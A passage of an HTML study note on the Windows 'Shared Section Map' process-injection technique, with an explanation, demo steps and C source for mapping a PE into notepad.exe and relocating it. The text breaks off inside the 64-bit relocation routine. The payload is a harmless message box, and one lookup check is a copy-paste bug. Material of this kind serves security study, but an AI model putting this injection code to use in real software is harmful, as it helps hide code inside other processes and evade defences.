<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Shared Section Map</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Process Injection - Shared Section Map</h1></strong><br />I don&#39;t know if this technique has a universal name.<br />I&#39;ve seen &quot;Zombify Process&quot;, &quot;NtCreateSection + NtMapViewOfSection&quot;.<br />Shared Section Map is what I came up with. Makes sense to me.<br /><br /><strong><h2>## Concept</h2></strong><br />A section object is a section of memory that can be shared with other processes.<br /><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views">https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views</a><br /><br />The concept behind this injection technique is to:<br />• create a section in your own process,<br />• and map a view of that section into the target process.<br /><br />Now anything you change/modify/write to the section in your own process will also happen in the target process.<br /><br />Because of this, you copy the PE you want to inject (yourself or another PE) into a section in your own process. <br />As a result, the PE will also be copied into the target process.<br /><br />From there, you resume execution in the target process by:<br />• creating a new thread<br />• hijacking a thread<br />• etc.<br /><br /><strong><h2>## Examples</h2></strong><br />• <a href="https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection">https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection</a><br />• <a href="https://github.com/MalwareTech/ZombifyProcess/blob/master/ZombieProcess/Main.cpp">https://github.com/MalwareTech/ZombifyProcess/blob/master/ZombieProcess/Main.cpp</a><br /><br /><strong><h2>## Function Overview</h2></strong><br />1. Create or open a process<br />2. <code>NtCreateSection</code> to create a section in your local (own) process<br />3. Create a section map in memory in your own process <code>NtMapViewOfSection</code><br />4. Create a section map in memory in the target process <code>NtMapViewOfSection</code><br />5. Copy the PE you want to inject into your local section map - <code>memcpy</code><br />   ◇ The section maps are mirrored, so the PE will also be written into the target&#39;s section map<br />7. Perform base relocations<br />8. Start execution in target process<br />   1) RtlCreateUserThread (new thread)<br />   2) Thread hijack<br />   3) etc.<br /><br /><strong><h2>## Variations</h2></strong><br />If you&#39;re injecting yourself into the target process, you can start execution at a function.<br />An easy way to go about and think about this is by naming your function <code>RemoteMain()</code> - i.e. this is the function that will run in the target process<br /><div class="codebox"><div class="codebox">int&nbsp;main(void)<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;SharedMemoryMapInject();<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;<br />}<br /><br />//&nbsp;This&nbsp;function&nbsp;will&nbsp;run&nbsp;in&nbsp;the&nbsp;target&nbsp;process<br />int&nbsp;RemoteMain(void)<br /><span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;hey&nbsp;:)&nbsp;i&#39;m&nbsp;running&nbsp;the&nbsp;target&nbsp;process&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br />• Inject self with RemoteMain + New Thread<br />• Inject self with RemoteMain + Hijack Thread<br /><br />• Inject PE + New Thread<br />• Inject PE + Hijack Thread<br />• Inect Shellcode + New Thread<br />• Inject Shellcode + Hijack Thread<br /><br /><strong><h2>## Demo</h2></strong><br />First, our code creates the target process.<br />In this case, <code>notepad.exe</code>.<br /><a href=""><img src="images/1640-1.png" alt="images/1640-1.png" /></a><br /><br />Next, a read/write section map is created in our own process.<br />It&#39;s currently empty.<br /><a href=""><img src="images/1640-2.png" alt="images/1640-2.png" /></a><br /><br />After that, a read/execute section map is created in the target process.<br />The map in the target is a map of our local process&#39;s section map.<br />Because our local section map is empty, the section map in the target is also empty.<br /><a href=""><img src="images/1640-3.png" alt="images/1640-3.png" /></a><br /><br />Next we copy our PE into our local section map.<br />Because the section map in the target mirrors anything that happens to our local section map, the PE is also copied into the target (seen below. addresses are different because I messed up the screenshots).<br /><a href=""><img src="images/1640-4.png" alt="images/1640-4.png" /></a><br /><br />With our PE inside the target, we can perform PE relocations and create a thread in the target to execute our desired function (in this case, <code>RemoteMain()</code>).<br /><br />We see that <code>notepad.exe</code> isn&#39;t suspended anymore, and that our code has successfully run.<br /><a href=""><img src="images/1640-5.png" alt="images/1640-5.png" /></a><br /><br /><strong><h2>## Code</h2></strong><br /><div class="codebox"><div class="codebox">/*&nbsp;<br />Example&nbsp;of&nbsp;process&nbsp;injection&nbsp;via&nbsp;a&nbsp;shared&nbsp;section&nbsp;map&nbsp;&amp;&nbsp;creating&nbsp;a&nbsp;new&nbsp;thread.<br />*/<br /><br />#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br />#include&nbsp;&lt;winternl.h&gt;<br /><br />typedef&nbsp;struct&nbsp;BASE_RELOCATION_ENTRY<br />{<br />	USHORT&nbsp;Offset&nbsp;:&nbsp;12;<br />	USHORT&nbsp;Type&nbsp;:&nbsp;4;<br />}&nbsp;BASE_RELOCATION_ENTRY,&nbsp;*&nbsp;PBASE_RELOCATION_ENTRY;<br /><br />//&nbsp;NT&nbsp;TYPEDEFS&nbsp;------------------------------<br />//&nbsp;for&nbsp;NtMapViewOfSection<br />typedef&nbsp;enum&nbsp;_SECTION_INHERIT&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;ViewShare&nbsp;=&nbsp;1,<br />&nbsp;&nbsp;&nbsp;&nbsp;ViewUnmap&nbsp;=&nbsp;2<br />}&nbsp;SECTION_INHERIT,&nbsp;*&nbsp;PSECTION_INHERIT;<br /><br />//&nbsp;for&nbsp;RtlCreateUserThread<br />typedef&nbsp;CLIENT_ID&nbsp;*PCLIENT_ID;<br /><br />//&nbsp;Ntdll&nbsp;function&nbsp;typedefs<br />typedef&nbsp;NTSTATUS(WINAPI*&nbsp;t_NtCreateSection)(<br />&nbsp;&nbsp;&nbsp;&nbsp;PHANDLE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SectionHandle,<br />&nbsp;&nbsp;&nbsp;&nbsp;ACCESS_MASK&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DesiredAccess,<br />&nbsp;&nbsp;&nbsp;&nbsp;POBJECT_ATTRIBUTES&nbsp;ObjectAttributes,<br />&nbsp;&nbsp;&nbsp;&nbsp;PLARGE_INTEGER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MaximumSize,<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SectionPageProtection,<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;AllocationAttributes,<br />&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FileHandle<br />&nbsp;&nbsp;&nbsp;&nbsp;);<br />typedef&nbsp;NTSTATUS(WINAPI*&nbsp;t_NtMapViewOfSection)(<br />&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SectionHandle,<br />&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ProcessHandle,<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BaseAddress,<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG_PTR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ZeroBits,<br />&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CommitSize,<br />&nbsp;&nbsp;&nbsp;&nbsp;PLARGE_INTEGER&nbsp;&nbsp;SectionOffset,<br />&nbsp;&nbsp;&nbsp;&nbsp;PSIZE_T&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ViewSize,<br />&nbsp;&nbsp;&nbsp;&nbsp;SECTION_INHERIT&nbsp;InheritDisposition,<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;AllocationType,<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Win32Protect<br />&nbsp;&nbsp;&nbsp;&nbsp;);<br />typedef&nbsp;NTSTATUS(WINAPI*&nbsp;t_NtUnmapViewOfSection)(<br />&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;ProcessHandle,<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;&nbsp;BaseAddress<br />&nbsp;&nbsp;&nbsp;&nbsp;);<br />typedef&nbsp;NTSTATUS(WINAPI*&nbsp;t_NtQueryInformationProcess)(<br />&nbsp;&nbsp;&nbsp;&nbsp;IN&nbsp;HANDLE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ProcessHandle,<br />&nbsp;&nbsp;&nbsp;&nbsp;IN&nbsp;PROCESSINFOCLASS&nbsp;ProcessInformationClass,<br />&nbsp;&nbsp;&nbsp;&nbsp;OUT&nbsp;PVOID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ProcessInformation,<br />&nbsp;&nbsp;&nbsp;&nbsp;IN&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ProcessInformationLength,<br />&nbsp;&nbsp;&nbsp;&nbsp;OUT&nbsp;PULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ReturnLength<br />&nbsp;&nbsp;&nbsp;&nbsp;);<br />typedef&nbsp;NTSTATUS(WINAPI*&nbsp;t_NtClose)(<br />&nbsp;&nbsp;&nbsp;&nbsp;IN&nbsp;HANDLE&nbsp;Handle<br />&nbsp;&nbsp;&nbsp;&nbsp;);<br />typedef&nbsp;NTSTATUS(WINAPI*&nbsp;t_RtlCreateUserThread)(<br />&nbsp;&nbsp;&nbsp;&nbsp;IN&nbsp;HANDLE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ProcessHandle,<br />&nbsp;&nbsp;&nbsp;&nbsp;IN&nbsp;PSECURITY_DESCRIPTOR&nbsp;SecurityDescriptor&nbsp;OPTIONAL,<br />&nbsp;&nbsp;&nbsp;&nbsp;IN&nbsp;BOOLEAN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CreateSuspended,<br />&nbsp;&nbsp;&nbsp;&nbsp;IN&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;StackZeroBits,<br />&nbsp;&nbsp;&nbsp;&nbsp;IN&nbsp;OUT&nbsp;PULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;StackReserved,<br />&nbsp;&nbsp;&nbsp;&nbsp;IN&nbsp;OUT&nbsp;PULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;StackCommit,<br />&nbsp;&nbsp;&nbsp;&nbsp;IN&nbsp;PVOID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;StartAddress,<br />&nbsp;&nbsp;&nbsp;&nbsp;IN&nbsp;PVOID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;StartParameter&nbsp;OPTIONAL,<br />&nbsp;&nbsp;&nbsp;&nbsp;OUT&nbsp;PHANDLE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ThreadHandle,<br />&nbsp;&nbsp;&nbsp;&nbsp;OUT&nbsp;PCLIENT_ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ClientID<br />&nbsp;&nbsp;&nbsp;&nbsp;);<br /><br />//&nbsp;My&nbsp;Ntdll&nbsp;functions<br />t_NtCreateSection&nbsp;d_NtCreateSection;<br />t_NtMapViewOfSection&nbsp;d_NtMapViewOfSection;<br />t_NtUnmapViewOfSection&nbsp;d_NtUnmapViewOfSection;<br />t_NtQueryInformationProcess&nbsp;d_NtQueryInformationProcess;<br />t_NtClose&nbsp;d_NtClose;<br />t_RtlCreateUserThread&nbsp;d_RtlCreateUserThread;<br /><br />int&nbsp;resolveNtFunctions()<br />{<br />	HMODULE&nbsp;hNtdll&nbsp;=&nbsp;GetModuleHandleW(L&quot;Ntdll.dll&quot;);<br /><br />	d_NtCreateSection&nbsp;=&nbsp;(t_NtCreateSection)GetProcAddress(hNtdll,&nbsp;&quot;NtCreateSection&quot;);<br />	if&nbsp;(d_NtCreateSection&nbsp;==&nbsp;NULL)<br />		return&nbsp;1;<br />	<br />	d_NtMapViewOfSection&nbsp;=&nbsp;(t_NtMapViewOfSection)GetProcAddress(hNtdll,&nbsp;&quot;NtMapViewOfSection&quot;);<br />	if&nbsp;(d_NtCreateSection&nbsp;==&nbsp;NULL)<br />		return&nbsp;2;<br />	<br />	d_NtUnmapViewOfSection&nbsp;=&nbsp;(t_NtUnmapViewOfSection)GetProcAddress(hNtdll,&nbsp;&quot;NtUnmapViewOfSection&quot;);<br />	if&nbsp;(d_NtCreateSection&nbsp;==&nbsp;NULL)<br />		return&nbsp;3;<br />	<br />	d_NtClose&nbsp;=&nbsp;(t_NtClose)GetProcAddress(hNtdll,&nbsp;&quot;NtClose&quot;);<br />	if&nbsp;(d_NtCreateSection&nbsp;==&nbsp;NULL)<br />		return&nbsp;4;<br />	<br />	d_NtQueryInformationProcess&nbsp;=&nbsp;(t_NtQueryInformationProcess)GetProcAddress(hNtdll,&nbsp;&quot;NtQueryInformationProcess&quot;);<br />	if&nbsp;(d_NtCreateSection&nbsp;==&nbsp;NULL)<br />		return&nbsp;5;<br />	<br />	d_RtlCreateUserThread&nbsp;=&nbsp;(t_RtlCreateUserThread)GetProcAddress(hNtdll,&nbsp;&quot;RtlCreateUserThread&quot;);<br />	if&nbsp;(d_NtCreateSection&nbsp;==&nbsp;NULL)<br />		return&nbsp;6;<br />	<br />	return&nbsp;0;<br />}<br /><br />int&nbsp;RemoteMain()<br />{<br />	MessageBoxW(NULL,&nbsp;L&quot;hello&nbsp;from&nbsp;target&nbsp;process&quot;,&nbsp;L&quot;title&nbsp;:)&quot;,&nbsp;MB_OK);<br />	ExitProcess(0);		//&nbsp;close&nbsp;injected&nbsp;application&nbsp;after&nbsp;code&nbsp;has&nbsp;finished&nbsp;executing<br /><br />	return&nbsp;0;<br />}<br /><br />int&nbsp;relocatePE_32(LPVOID&nbsp;sourceBase,&nbsp;LPVOID&nbsp;targetBase)<br />{<br />	DWORD&nbsp;delta&nbsp;=&nbsp;0;<br />	PIMAGE_DOS_HEADER&nbsp;local_DosHeader;<br />	PIMAGE_NT_HEADERS&nbsp;local_NtHeader;<br />	PIMAGE_BASE_RELOCATION&nbsp;local_RelocTable;<br />	PIMAGE_BASE_RELOCATION&nbsp;relocBlock;<br />	DWORD&nbsp;relocTable_Size;<br /><br />	printf(&quot;[*]&nbsp;performing&nbsp;relocations&nbsp;\n&quot;);<br /><br />	//&nbsp;calculate&nbsp;difference&nbsp;in&nbsp;base&nbsp;addresses<br />	printf(&quot;\t&nbsp;source&nbsp;base:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)sourceBase);<br />	printf(&quot;\t&nbsp;target&nbsp;base:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)targetBase);<br /><br />	delta&nbsp;=&nbsp;(DWORD)targetBase&nbsp;-&nbsp;(DWORD)sourceBase;<br />	printf(&quot;\t&nbsp;delta:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)delta);<br /><br />	if&nbsp;(delta&nbsp;==&nbsp;0)<br />	{<br />		printf(&quot;\t&nbsp;deltas&nbsp;are&nbsp;the&nbsp;same.&nbsp;no&nbsp;relocations&nbsp;needed&nbsp;\n&quot;);<br />		return&nbsp;0;<br />	}<br /><br />	//&nbsp;grab&nbsp;relocation&nbsp;table<br />	local_DosHeader&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)sourceBase;<br />	local_NtHeader&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((DWORD_PTR)sourceBase&nbsp;+&nbsp;(DWORD_PTR)local_DosHeader-&gt;e_lfanew);<br />	local_RelocTable&nbsp;=&nbsp;(PIMAGE_BASE_RELOCATION)((DWORD_PTR)sourceBase&nbsp;+&nbsp;(DWORD_PTR)local_NtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);<br />	relocTable_Size&nbsp;=&nbsp;local_NtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;<br /><br />	printf(&quot;&nbsp;&nbsp;&nbsp;&nbsp;reloc&nbsp;table:&nbsp;\n&quot;);<br />	printf(&quot;\t&nbsp;offset:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)local_NtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);<br />	printf(&quot;\t&nbsp;address:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)local_RelocTable);<br />	printf(&quot;\t&nbsp;size:&nbsp;0x%x&nbsp;\n\n&quot;,&nbsp;relocTable_Size);<br /><br />	//&nbsp;grab&nbsp;first&nbsp;relocation&nbsp;block<br />	//&nbsp;first&nbsp;relocation&nbsp;block&nbsp;is&nbsp;at&nbsp;same&nbsp;address&nbsp;as&nbsp;relocation&nbsp;table<br />	relocBlock&nbsp;=&nbsp;local_RelocTable;<br /><br />	//&nbsp;loop&nbsp;through&nbsp;relocation&nbsp;table<br />	DWORD&nbsp;blockNumber&nbsp;=&nbsp;1;<br />	DWORD&nbsp;entryCount&nbsp;=&nbsp;0;<br />	DWORD&nbsp;relocTable_Position&nbsp;=&nbsp;0;<br />	DWORD&nbsp;relocTable_End&nbsp;=&nbsp;relocTable_Size;<br />	while&nbsp;(relocTable_Position&nbsp;&lt;&nbsp;relocTable_End)<br />	{<br />		//&nbsp;read&nbsp;block&nbsp;info<br />		printf(&quot;\t&nbsp;block&nbsp;#%d&nbsp;\n&quot;,&nbsp;blockNumber);<br />		printf(&quot;\t\t&nbsp;rva:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)relocBlock-&gt;VirtualAddress);<br />		printf(&quot;\t\t&nbsp;size:&nbsp;0x%x&nbsp;\n&quot;,&nbsp;relocBlock-&gt;SizeOfBlock);<br />		entryCount&nbsp;=&nbsp;(relocBlock-&gt;SizeOfBlock&nbsp;-&nbsp;sizeof(IMAGE_BASE_RELOCATION))&nbsp;/&nbsp;sizeof(WORD);<br />		printf(&quot;\t\t&nbsp;entries:&nbsp;%d&nbsp;\n&quot;,&nbsp;entryCount);<br /><br />		//&nbsp;grab&nbsp;first&nbsp;relocation&nbsp;entry&nbsp;in&nbsp;block<br />		PBASE_RELOCATION_ENTRY&nbsp;relocEntry&nbsp;=&nbsp;(PBASE_RELOCATION_ENTRY)(relocBlock&nbsp;+&nbsp;1);<br /><br />		//&nbsp;loop&nbsp;through&nbsp;entries&nbsp;in&nbsp;block<br />		for&nbsp;(DWORD&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;entryCount;&nbsp;i++)<br />		{<br />			//&nbsp;read&nbsp;original&nbsp;entry<br />			PDWORD&nbsp;relocAddr&nbsp;=&nbsp;(LPVOID)((DWORD)sourceBase&nbsp;+&nbsp;relocBlock-&gt;VirtualAddress&nbsp;+&nbsp;relocEntry-&gt;Offset);<br /><br />			printf(&quot;\t\t\t&nbsp;reloc&nbsp;addr:&nbsp;0x%p&nbsp;&quot;,&nbsp;(LPVOID)relocAddr);<br />			printf(&quot;value:&nbsp;0x%p&nbsp;&quot;,&nbsp;(LPVOID)*relocAddr);<br /><br />			//&nbsp;only&nbsp;relocate&nbsp;if&nbsp;type&nbsp;is&nbsp;HIGHLOW&nbsp;(for&nbsp;x86)<br />			if&nbsp;(relocEntry-&gt;Type&nbsp;==&nbsp;IMAGE_REL_BASED_HIGHLOW)<br />			{<br />				//&nbsp;calculate&nbsp;modified&nbsp;value<br />				DWORD&nbsp;modifiedValue&nbsp;=&nbsp;*relocAddr&nbsp;+&nbsp;delta;		//&nbsp;modifiedValue&nbsp;=&nbsp;data&nbsp;@&nbsp;relocAddr&nbsp;+&nbsp;delta;<br /><br />				//&nbsp;overwrite&nbsp;orignial&nbsp;value&nbsp;with&nbsp;modified&nbsp;value<br />				*relocAddr&nbsp;=&nbsp;modifiedValue;<br />				printf(&quot;modified&nbsp;value:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)*relocAddr);<br />			}<br />			else&nbsp;if&nbsp;(relocEntry-&gt;Type&nbsp;==&nbsp;IMAGE_REL_BASED_ABSOLUTE)<br />			{<br />				printf(&quot;type:&nbsp;ASBOLUTE&nbsp;-&nbsp;skipping&nbsp;relocation&nbsp;\n&quot;);<br />			}<br />			else<br />			{<br />				printf(&quot;type:&nbsp;%d&nbsp;(unsupported)&nbsp;-&nbsp;skipping&nbsp;relocation&nbsp;\n&quot;,&nbsp;relocEntry-&gt;Type);<br />			}<br /><br />			//&nbsp;advance&nbsp;to&nbsp;next&nbsp;entry<br />			relocEntry&nbsp;+=&nbsp;1;<br />		}<br /><br />		//&nbsp;advance&nbsp;to&nbsp;next&nbsp;block<br />		blockNumber&nbsp;+=&nbsp;1;<br />		relocTable_Position&nbsp;+=&nbsp;relocBlock-&gt;SizeOfBlock;<br />		relocBlock&nbsp;=&nbsp;(PIMAGE_BASE_RELOCATION)((DWORD64)relocBlock&nbsp;+&nbsp;relocBlock-&gt;SizeOfBlock);<br />	}<br /><br />	return&nbsp;0;<br />}<br /><br />int&nbsp;relocatePE_64(LPVOID&nbsp;sourceBase,&nbsp;LPVOID&nbsp;targetBase)<br />{<br />	DWORD64&nbsp;delta&nbsp;=&nbsp;0;<br />	PIMAGE_DOS_HEADER&nbsp;local_DosHeader;<br />	PIMAGE_NT_HEADERS&nbsp;local_NtHeader;<br />	PIMAGE_BASE_RELOCATION&nbsp;local_RelocTable;<br />	PIMAGE_BASE_RELOCATION&nbsp;relocBlock;<br />	DWORD&nbsp;relocTable_Size;<br /><br />	printf(&quot;[*]&nbsp;performing&nbsp;relocations&nbsp;\n&quot;);<br /><br />	//&nbsp;calculate&nbsp;difference&nbsp;in&nbsp;base&nbsp;addresses<br />	printf(&quot;\t&nbsp;source&nbsp;base:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)sourceBase);<br />	printf(&quot;\t&nbsp;target&nbsp;base:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)targetBase);<br /><br />	delta&nbsp;=&nbsp;(DWORD64)targetBase&nbsp;-&nbsp;(DWORD64)sourceBase;<br />	printf(&quot;\t&nbsp;delta:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)delta);<br /><br />	if&nbsp;(delta&nbsp;==&nbsp;0)<br />	{<br />		printf(&quot;\t&nbsp;deltas&nbsp;are&nbsp;the&nbsp;same.&nbsp;no&nbsp;relocations&nbsp;needed&nbsp;\n&quot;);<br />		return&nbsp;0;<br />	}<br /><br />	//&nbsp;grab&nbsp;relocation&nbsp;table<br />	local_DosHeader&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)sourceBase;<br />	local_NtHeader&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((DWORD_PTR)sourceBase&nbsp;+&nbsp;(DWORD_PTR)local_DosHeader-&gt;e_lfanew);<br />	local_RelocTable&nbsp;=&nbsp;(PIMAGE_BASE_RELOCATION)((DWORD_PTR)sourceBase&nbsp;+&nbsp;(DWORD_PTR)local_NtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);<br />	relocTable_Size&nbsp;=&nbsp;local_NtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;<br /><br />	printf(&quot;&nbsp;&nbsp;&nbsp;&nbsp;reloc&nbsp;table:&nbsp;\n&quot;);<br />	printf(&quot;\t&nbsp;offset:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)local_NtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);<br />	printf(&quot;\t&nbsp;address:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)local_RelocTable);<br />	printf(&quot;\t&nbsp;size:&nbsp;0x%x&nbsp;\n\n&quot;,&nbsp;relocTable_Size);<br /><br />	//&nbsp;grab&nbsp;first&nbsp;relocation&nbsp;block<br />	//&nbsp;first&nbsp;relocation&nbsp;block&nbsp;is&nbsp;at&nbsp;same&nbsp;address&nbsp;as&nbsp;relocation&nbsp;table<br />	relocBlock&nbsp;=&nbsp;local_RelocTable;<br /><br />	//&nbsp;loop&nbsp;through&nbsp;relocation&nbsp;table<br />	DWORD&nbsp;blockNumber&nbsp;=&nbsp;1;<br />	DWORD&nbsp;entryCount&nbsp;=&nbsp;0;<br />	DWORD&nbsp;relocTable_Position&nbsp;=&nbsp;0;<br />	DWORD&nbsp;relocTable_End&nbsp;=&nbsp;relocTable_Size;<br />	while&nbsp;(relocTable_Position&nbsp;&lt;&nbsp;relocTable_End)<br />	{<br />		//&nbsp;read&nbsp;block&nbsp;info<br />		printf(&quot;\t&nbsp;block&nbsp;#%d&nbsp;\n&quot;,&nbsp;blockNumber);<br />		printf(&quot;\t\t&nbsp;rva:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)relocBlock-&gt;VirtualAddress);<br />		printf(&quot;\t\t&nbsp;size:&nbsp;0x%x&nbsp;\n&quot;,&nbsp;relocBlock-&gt;SizeOfBlock);<br />		entryCount&nbsp;=&nbsp;(relocBlock-&gt;SizeOfBlock&nbsp;-&nbsp;sizeof(IMAGE_BASE_RELOCATION))&nbsp;/&nbsp;sizeof(WORD);<br />		printf(&quot;\t\t&nbsp;entries:&nbsp;%d&nbsp;\n&quot;,&nbsp;entryCount);<br /><br />		//&nbsp;grab&nbsp;first&nbsp;relocation&nbsp;entry&nbsp;in&nbsp;block<br />		PBASE_RELOCATION_ENTRY&nbsp;relocEntry&nbsp;=&nbsp;(PBASE_RELOCATION_ENTRY)(relocBlock&nbsp;+&nbsp;1);<br /><br />		//&nbsp;loop&nbsp;through&nbsp;entries&nbsp;in&nbsp;block<br />		for&nbsp;(DWORD&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;entryCount;&nbsp;i++)<br />		{<br />			//&nbsp;read&nbsp;original&nbsp;entry<br />			PDWORD64&nbsp;relocAddr&nbsp;=&nbsp;(LPVOID)((DWORD64)sourceBase&nbsp;+&nbsp;relocBlock-&gt;VirtualAddress&nbsp;+&nbsp;relocEntry-&gt;Offset);<br /><br />			printf(&quot;\t\t\t&nbsp;reloc&nbsp;addr:&nbsp;0x%p&nbsp;&quot;,&nbsp;(LPVOID)relocAddr);<br />			printf(&quot;value:&nbsp;0x%p&nbsp;&quot;,&nbsp;(LPVOID)*relocAddr);<br /><br />			//&nbsp;only&nbsp;relocate&nbsp;if&nbsp;type&nbsp;is&nbsp;DIR64&nbsp;(for&nbsp;x64)<br />			if&nbsp;(relocEntry-&gt;Type&nbsp;==&nbsp;IMAGE_REL_BASED_DIR64)<br />			{<br />				//&nbsp;calculate&nbsp;modified&nbsp;value<br />				DWORD64&nbsp;modifiedValue&nbsp;=&nbsp;*relocAddr&nbsp;+&nbsp;delta;		//&nbsp;modifiedValue&nbsp;=&nbsp;data&nbsp;@&nbsp;relocAddr&nbsp;+&nbsp;delta;<br /><br />				